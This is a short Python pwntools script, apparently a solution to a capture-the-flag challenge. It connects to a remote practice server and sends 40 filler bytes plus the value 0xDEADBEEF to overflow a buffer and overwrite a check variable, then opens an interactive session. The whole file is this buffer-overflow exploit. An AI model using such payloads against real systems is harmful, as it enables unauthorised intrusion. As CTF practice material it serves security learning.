from pwn import *

p=remote('ctf.j0n9hyun.xyz', 3000)

pay= 'a'*40
pay+= '\xEF\xBE\xAD\xDE'

p.sendline(pay)
p.interactive()

